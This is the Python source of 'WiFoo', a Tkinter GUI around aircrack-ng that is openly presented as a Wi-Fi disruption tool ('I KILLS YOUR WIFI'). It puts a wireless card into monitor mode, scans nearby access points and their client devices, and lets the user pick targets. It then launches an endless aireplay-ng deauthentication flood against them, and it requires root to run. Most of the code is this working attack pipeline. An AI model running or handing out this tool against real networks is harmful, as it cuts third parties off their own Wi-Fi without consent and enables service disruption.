#!/usr/bin/python3

# + TODO: Disable monitor mode on script exit
# + TODO: Make app icon using icon_script, without any external libraries
# + TODO: Make installation instructions

# - TODO: Check for monitor mode enabled devices before starting
# - TODO: Refactor code




icon_script = '''\

                      .ed"""" """$$$$be.
                    -"           ^""**$$$e.
                  ."                   '$$$c
                 /                      "4$$b
                d  3                      $$$$
                $  *                   .$$$$$$
               .$  ^c           $$$$$e$$$$$$$$.
               d$L  4.         4$$$$$$$$$$$$$$b
               $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
   e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
  z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
 4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
 ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
   "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
         "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
           ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
              "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
                "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                   "$   "%*ebJLzb$e$$$$$b $P"
                     %..      4$$$$$$$$$$ "
                      $$$e   z$$$$$$$$$$%
                       "*$c  "$$$$$$$P"
                        ."""*$$$$$$$$bc
                     .-"    .$***$$$"""*e.
                  .-"    .e$"     "*$c  ^*b.
           .=*""""    .e$*"          "*bc  "*$e..
         .$"        .z*"               ^*$e.   "*****e.
         $$ee$c   .d"                     "*$.        3.
         ^*$E")$..$"                         *   .ee==d%
            $.d$$$*                           *  J$$$e*
             """""                              "$$$"

##### ##### ##### #### I KILLS YOUR WIFI #### ##### #### #### #####
'''

from tkinter import *
from tkinter import ttk
from tkinter import messagebox
import tkinter as tk


import time
import re
import subprocess
import os
import logging
import signal
import random
from threading import Thread
import atexit



def get_random_colored_ppm_icon(icon):
  icon_size = 64


  header_string = \
  "P6\n" +  "%s %s\n"%(icon_size,icon_size)+  "255\n"


  RED = [255,0,0]
  GREEN = [0,255,0]
  YELLOW = [255,255,0]
  WHITE = [255,255,255]
  CYAN = [0,255,255]
  MAGENTA = [255,0,255]
  CORAL = [255,127,80]
  BLACK = [0,0,0]

  colors = [RED,GREEN,YELLOW,WHITE,CYAN,MAGENTA,CORAL,BLACK]

  background_color = random.choice(colors)
  icon_color = random.choice(colors)

  while background_color == icon_color:
    icon_color = random.choice(colors)

  rgb_data = background_color * (icon_size*icon_size)
 

  for i,line in enumerate(icon.split('\n')):
    for j,c in enumerate(line):
      if j< icon_size:

        shift = (i)*icon_size*3
        
        if c != " ":
          
          rgb_data[(shift*2)+(j*3):(shift*2)+(j*3)+3] = icon_color
          rgb_data[(shift*2)+(j*3) + icon_size*3 : (shift*2)+(j*3)+3 + icon_size*3] = icon_color


  

  return header_string.encode() + bytes(rgb_data)



def put_in_xterm_format(command):
    return 'xterm -iconic -title shell -geometry 200x24+0+1000 -e "%s"'%command


def run_command_in_shell(command_to_run,max_timeout_in_sec=None,discard_output_and_return_pid=False):
    print("running command:",command_to_run)

    if discard_output_and_return_pid:
        process = subprocess.Popen(put_in_xterm_format(command_to_run), stdout=None, stderr=None, shell=True, preexec_fn=os.setsid)
        return process.pid

    else:
        output=""        

        with open("/tmp/wifoo_out.txt",'w+') as infile:
            with subprocess.Popen(put_in_xterm_format(command_to_run + " > /tmp/wifoo_out.txt 2>&1"), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, preexec_fn=os.setsid) as process: 
                try:
                    process.communicate(timeout=max_timeout_in_sec)[0]
                except subprocess.TimeoutExpired:
                    os.killpg(process.pid, signal.SIGKILL)
                    process.communicate()[0]
            
                infile.seek(0)
                output = "".join(infile.readlines())

        return output



def parse_interface_list(output_of_command):
    ## Takes output of the below command:
    ##   sudo airmon-ng

    ##output should be similar to this:
        
    '''

    PHY	Interface	Driver		Chipset

    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)
    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)


    '''
        
    text_to_parse = output_of_command

    text_to_parse = text_to_parse.splitlines()

    text_to_parse = list(filter(None, text_to_parse))


    wifi_cards = text_to_parse[1:]

    found_interface_list = list(str())
    for i in wifi_cards:
        found_interface_list.append(i.split('\t')[1])

    return found_interface_list



def get_interface_list():
    return parse_interface_list(run_command_in_shell("airmon-ng",1))



def parse_monitor_mode_enabled_interface_name(output_of_command):
    ## Takes output of the below command:
    ##  sudo airmon-ng start wlp3s0

    ##output should be similar to this:
        
    '''

    Found 4 processes that could cause trouble.
    If airodump-ng, aireplay-ng or airtun-ng stops working after
    a short period of time, you may want to run 'airmon-ng check kill'

    PID Name
    921 NetworkManager
    930 avahi-daemon
    954 avahi-daemon
    1041 wpa_supplicant

    PHY	Interface	Driver		Chipset

    phy0	wlp3s0		iwlwifi		Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)

            (mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)
            (mac80211 station mode vif disabled for [phy0]wlp3s0)


    '''
    text_to_parse=output_of_command

    match = re.search("monitor mode vif(?: already)? enabled for .* on .*\](.*)\)", text_to_parse)
    if match:
        found_monitor_mode_interface = match.group(1)
        return found_monitor_mode_interface
 

    
    return None
    


def get_monitor_mode_enabled_interface_using_non_monitor_mode_enabled_interface(interface_to_enable_monitor_mode_on):
    enable_monitor_mode_output = run_command_in_shell("airmon-ng start "+interface_to_enable_monitor_mode_on,3)
    return parse_monitor_mode_enabled_interface_name(enable_monitor_mode_output)#TODO: this line can be improved


def parse_routers_and_devices_on_nearby_networks(output_of_command):
    ## Takes output of the below command:
    ##  sudo airodump-ng mon0
    all_found_routers = list()
    all_found_devices = list()

    ##output should be similar to this:

    '''










































     CH  8 ][ Elapsed: 4 s ][ 2018-04-05 20:08                                         
                                                                                                                 
     BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                 
     88:DC:96:0D:FC:60  -73       48       26    1   6  54e. WPA2 CCMP   PSK  DODO                               
     88:DC:96:0D:FC:60  -73       48       26    1   6  54e. WPA2 CCMP   PSK  DODO                               
     88:DC:96:0D:FC:60  -73       48       26    1   6  54e. WPA2 CCMP   PSK  DODO                               
                                                                                                                     
     BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                   
                                                                                                                 
     88:DC:96:0D:FC:60  80:7A:BF:BB:D8:16  -51    0e- 1      1       27                                           
     88:DC:96:0D:FC:60  84:B5:41:50:78:D2  -84    0 - 1      0        1                                           

    '''

    text_to_parse = output_of_command



    matches = tuple(re.finditer(r"\[J\[1;1H", text_to_parse,re.MULTILINE|re.DOTALL))

    text_to_parse = text_to_parse[matches[-2].start() : matches[-1].start()]



    
    match = re.search(r"BSSID\s*PWR\s*Beacons\s*#Data,\s*#/s\s*CH\s*MB\s*ENC\s*CIPHER\s*AUTH\s*ESSID\s*(.*)BSSID\s*STATION\s*PWR\s*Rate\s*Lost\s*Frames\s*Probe(.*)", text_to_parse,re.MULTILINE|re.DOTALL)

    if match:
        if match.group(1):
            found_routers_info = match.group(1).split('\n')

        if match.group(2):
            found_devices_info = match.group(2).split('\n')





        for router_info in found_routers_info:
            
                router_info = router_info.split(" ")
                router_info = list(filter(None, router_info))
                if len(router_info) > 0:
                    
##                    KEEP THIS FOR REFERENCE
                    
##                    router_bssid = router_info[0]
##                    router_pwr = router_info[1]
##                    router_beacons = router_info[2]
##                    router_data = router_info[3]
##                    router_s = router_info[4]
##                    router_ch = router_info[5]
##                    router_mb = router_info[6]
##                    router_enc = router_info[7]
##                    router_cipher = router_info[8]
##                    router_auth = router_info[9]
##                    router_essid = router_info[10]
                    
                    all_found_routers.append(router_info)
            
            
        for device_info in found_devices_info:
            
                device_info = device_info.split(" ")
                device_info = list(filter(None, device_info))
                if len(device_info) > 0:
                    
##                    KEEP THIS FOR REFERENCE
                    
##                    device_bssid = device_info[0]
##                    device_station = device_info[1]
##                    device_pwr = device_info[2]
##                    device_rate = device_info[3]
##                    device_lost = device_info[4]
##                    device_frames = device_info[5]
##                    device_probe = device_info[6]


                    all_found_devices.append(device_info)

            
            
    return all_found_routers,all_found_devices

def get_routers_and_devices_on_nearby_networks(monitor_mode_enabled_interface):

    return parse_routers_and_devices_on_nearby_networks(run_command_in_shell("airodump-ng "+monitor_mode_enabled_interface,10))



class GetRoutersAndDevices:
    def __init__(self, master,chosen_non_monitor_mode_enabled_interface):
        ppm_icon = get_random_colored_ppm_icon(icon_script)
        img_icon = PhotoImage(data=ppm_icon)
        
        master.tk.call('wm', 'iconphoto', master._w, img_icon) 

     

        self.is_blocking = False
        self.selected_devices_indexes = []
        self.pid_deauth_command = -1

        self.master = master
        master.title("Routers and devices")

        self.monitor_mode_enabled_interface = get_monitor_mode_enabled_interface_using_non_monitor_mode_enabled_interface(chosen_non_monitor_mode_enabled_interface)
        if(self.monitor_mode_enabled_interface != ""):
            atexit.register(self.stop_monitor_mode)

        self.all_routers,self.all_devices = get_routers_and_devices_on_nearby_networks(self.monitor_mode_enabled_interface)




        self.wifi_listbox = Listbox(self.master)
        self.choose_devices_listbox = Listbox(self.master,selectmode='multiple')
        selected_devices_indexes=list()

        self.wifi_listbox.configure(background='black',foreground="yellow")
        self.choose_devices_listbox.configure(background='black',foreground="yellow")


        self.master.geometry("500x400")
        self.master.configure(background='black')
        choose_wifi = Label(self.master, text='Step 1: Choose Wifi: ',anchor='nw')   
        choose_wifi.pack()
        choose_wifi.configure(background='black',foreground="yellow")



        self.wifi_listbox.bind('<<ListboxSelect>>',self.cursor_event_choose_wifi_listbox)
        self.wifi_listbox.pack(fill=BOTH)
        for item in self.all_routers:
            item_listbox_format = item[0] + "    ------>    " + item[-1]
            self.wifi_listbox.insert(END, item_listbox_format)
            



        self.toggle_block_or_permit_button = Button(self.master, text="Deauth selected devices", background='red', command=self.toggle_block_or_permit_devices)
        self.toggle_block_or_permit_button.pack(side=BOTTOM, fill=X)


        choose_devices = Label(self.master, text='Step 2: Choose Devices: ',anchor='nw')   
        choose_devices.pack()
        choose_devices.configure(background='black',foreground="yellow")


        self.choose_devices_listbox.bind('<<ListboxSelect>>',self.cursor_event_choose_devices_listbox)
        self.choose_devices_listbox.pack(fill=BOTH)



    def stop_monitor_mode(self):
        stop_monitor_mode_command = "airmon-ng stop %s"%(self.monitor_mode_enabled_interface)
        run_command_in_shell(stop_monitor_mode_command,10)



    def cursor_event_choose_wifi_listbox(self,event):
        if len(self.wifi_listbox.curselection()) > 0:
            self.router_selected = self.all_routers[self.wifi_listbox.curselection()[0]]
            self.choose_devices_listbox.delete(0,END)
            for item in self.get_devices_connected_to_router(self.router_selected[0], self.all_devices):
                item_listbox_format = item[0] + "    ------>    Frames: " + item[-1]
                self.choose_devices_listbox.insert(END, item_listbox_format)



    def cursor_event_choose_devices_listbox(self,event):
        self.selected_devices_indexes = self.choose_devices_listbox.curselection()
        

        

    def block_selected_devices(self):
        selected_devices_macs = []
        selected_ap_mac = self.router_selected[0]

        for i in self.selected_devices_indexes:
            self.choose_devices_listbox.itemconfig(i,background='red')

            selected_devices_macs.append(self.get_devices_connected_to_router(selected_ap_mac, self.all_devices)[i][1])
            



        if selected_devices_macs != []:
            
            selected_ap_channel = self.router_selected[5]

            client_mac_params = " -c ".join(selected_devices_macs)



            lock_channel_command = "airodump-ng -c %s %s"%(selected_ap_channel,self.monitor_mode_enabled_interface)
            run_deauth_command = "aireplay-ng -0 0 -a %s -c %s %s"%(selected_ap_mac,client_mac_params,self.monitor_mode_enabled_interface)


            self.choose_devices_listbox.selection_clear(0,END)

            run_command_in_shell(lock_channel_command,3)
            self.pid_deauth_command = run_command_in_shell(run_deauth_command,discard_output_and_return_pid=True)


            if self.pid_deauth_command > 0:
                return True


        else:
            tk.messagebox.showinfo("Device not selected", "Please select devices to block")




    def permit_all_devices(self):
        print("allowing access to all")

        for i,item in enumerate(self.get_devices_connected_to_router(self.router_selected[0], self.all_devices)):
            self.choose_devices_listbox.itemconfig(i,background='black')


        if os.killpg(self.pid_deauth_command, signal.SIGKILL) == None:
            return True

    def toggle_block_or_permit_devices(self):
        if self.is_blocking:
            if self.permit_all_devices():
                self.toggle_block_or_permit_button.configure(background = 'red',text = 'Deauth selected devices') 
                self.is_blocking = False
            

        else:
            if self.block_selected_devices():
                self.toggle_block_or_permit_button.configure(background = 'green',text = 'Allow everyone') 
                self.is_blocking = True

        



    def get_devices_connected_to_router(self,router,all_devices):
        current_router_devices = list()
        for device in all_devices:
            if router == device[0]:
                current_router_devices.append(device)

        return current_router_devices





        
        



class ChooseInterface:
    def __init__(self, master):      
        self.master = master
        master.title("Choose interface")
        master.resizable(False, False)
        master.configure(background='black')

        ppm_icon = get_random_colored_ppm_icon(icon_script)
        img_icon = PhotoImage(data=ppm_icon)
        
        master.tk.call('wm', 'iconphoto', master._w, img_icon) 


        w = 180
        h = 100 

        ws = master.winfo_screenwidth() 
        hs = master.winfo_screenheight()

        x = (ws/2) - (w/2)
        y = (hs/2) - (h/2)

        self.master.geometry('%dx%d+%d+%d' % (w, h, x, y))





        self.label = Label(self.master, text="Select which interface to \nenable monitor mode on: ")
        self.label.grid(row=1, column=2)
        self.label.configure(background='black',foreground="yellow")

        found_interfaces_list = get_interface_list()
        
        self.cbox = ttk.Combobox(self.master)
        self.cbox.grid(row=2, column=2)
        self.cbox['values']=found_interfaces_list
        self.cbox.current(0)
        self.cbox.configure(foreground="black")
        




        

        self.nextbtn = tk.Button(self.master,text = "Next",command = lambda:self.start_enable_monitor_mode_gui(self.cbox.get()))
        self.nextbtn.grid(row=3, column=2)
        self.nextbtn.configure(background='black',foreground="yellow")
        


        
        
        

    def start_enable_monitor_mode_gui(self,chosen_non_monitor_mode_enabled_interface):
        self.master.destroy()

        self.newWindow = Tk()
        self.app = GetRoutersAndDevices(self.newWindow,chosen_non_monitor_mode_enabled_interface)



class SplashScreen(Frame):
    def __init__(self, master):
        start = time.time()



        Frame.__init__(self, master,background='#ffffff')
        self.grid()

        
        

        # get screen width and height
        ws = self.master.winfo_screenwidth()
        hs = self.master.winfo_screenheight()
        w = 500
        h = 300
        # calculate position x, y
        x = (ws/2) - (w/2) 
        y = (hs/2) - (h/2)
        self.master.geometry('%dx%d+%d+%d' % (w, h, x, y))
        
        self.master.overrideredirect(True)
        self.lift()





        canvas = Canvas(self,width=w, height=h,background='#ffffff')

        version_picture = "version1.gif"
        if os.path.isfile(version_picture):
            gif1 = PhotoImage(file=version_picture)
            canvas.create_image((0, 0), image=gif1, anchor='nw')

        else:
            canvas.create_text(250,150,fill="darkblue",font="Times 20 italic bold",
                        text="WiFoo is open-source get it from: \nhttps://github.com/abeltesfaye/WiFoo")

        canvas.grid()


        self.label = Label(master, text="Wifoo: version 1.0")
        self.label.grid(row=0, column=0,sticky='se')
        self.label.config(background="#ffffff")

        
        self.update()


        while True:
            if time.time() - start > 2:
                self.start_choose_interface(None)
                break

        


    def start_choose_interface(self,event):
        self.master.destroy()

        self.newWindow = Tk()
        
        self.app = ChooseInterface(self.newWindow)
        
        
          
        


def main():
    root = Tk()
    root.config(background="#ffffff")


    



    if os.getuid() == 0:
        app = SplashScreen(root)
        root.mainloop()
    else:
        root.withdraw()
        tk.messagebox.showinfo("I NEED ROOOOOT!!!!!!!!!", "This app needs to be run as root.")

    


    



if __name__ == '__main__':
    main()


